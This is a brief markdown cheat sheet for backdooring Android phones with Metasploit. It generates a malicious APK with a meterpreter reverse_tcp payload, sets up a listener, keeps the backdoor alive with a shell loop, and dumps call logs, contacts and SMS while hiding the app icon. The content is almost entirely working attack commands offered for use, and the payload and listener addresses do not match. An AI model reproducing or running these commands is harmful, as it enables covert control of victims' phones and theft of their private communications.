
#### Generating Milicious APK

```console
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=4444 R > /root/Desktop/pentest.apk
```

#### Now, lets set-up a Listener:
```console
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.0.4
exploit
```

#### Making Backdoor persistant
```console
while true;do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity;sleep 10;done
```

#### Some Basic Info Dump
```console
dump_calllog
dump_contacts
dump_sms
hide_app_icon
```

